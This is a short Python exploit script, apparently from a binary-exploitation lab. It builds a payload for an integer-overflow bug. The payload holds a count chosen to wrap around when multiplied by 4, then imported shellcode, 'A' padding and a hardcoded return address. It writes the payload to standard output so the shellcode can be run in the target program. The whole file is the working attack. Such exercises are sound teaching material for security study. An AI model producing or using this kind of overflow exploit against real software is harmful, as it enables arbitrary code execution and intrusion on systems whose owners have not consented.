#!/usr/bin/env python3

import sys
from shellcode import shellcode

# Craft a large count that will cause an integer overflow when multiplied by 4
count = 0x400000000000000E



# Construct the payload
payload = (
    count.to_bytes(8, 'little') +
    shellcode +
    b"A" * (120 - len(shellcode)) +
    (0x7ffffff6d110).to_bytes(8, 'little')
)

print(len(shellcode))
# Write payload to standard output
sys.stdout.buffer.write(payload)
